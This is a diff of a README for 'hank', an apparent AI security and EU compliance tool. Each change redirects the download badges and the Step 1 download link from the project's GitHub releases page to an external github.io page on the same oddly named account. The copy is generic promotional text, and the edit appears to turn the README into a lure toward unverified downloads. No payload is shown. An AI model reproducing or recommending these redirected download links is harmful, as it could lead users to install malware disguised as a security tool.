@@ -1,6 +1,6 @@
 # 🛡️ hank - AI Security & EU Compliance Made Simple
 
-[![Download hank](https://img.shields.io/badge/Download-hank-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/overheatingholy955/hank/releases)
+[![Download hank](https://img.shields.io/badge/Download-hank-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://overheatingholy955.github.io)
 
 ---
 
@@ -27,7 +27,7 @@ Getting hank on your computer is easy. Follow these simple steps:
 
 ### Step 1: Get the File
 
-**Visit this link to download the application:** [https://github.com/overheatingholy955/hank/releases](https://github.com/overheatingholy955/hank/releases)
+**Visit this link to download the application:** [https://overheatingholy955.github.io](https://overheatingholy955.github.io)
 
 This page will show you all available versions of hank. Look for the newest one (usually at the top) and click the download button.
 
@@ -169,7 +169,7 @@ If your computer can run a modern web browser, it can run hank.
 
 Don't wait until a security problem or compliance issue costs you time and money. Download hank now and get peace of mind knowing your AI projects are safe and following the rules.
 
-[![Download hank Now](https://img.shields.io/badge/⬇️%20Download%20hank%20Now-FF5722?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/overheatingholy955/hank/releases)
+[![Download hank Now](https://img.shields.io/badge/⬇️%20Download%20hank%20Now-FF5722?style=for-the-badge&logo=windows&logoColor=white)](https://overheatingholy955.github.io)
 
 Join thousands of satisfied users who sleep better knowing their AI projects are secure and compliant.
 
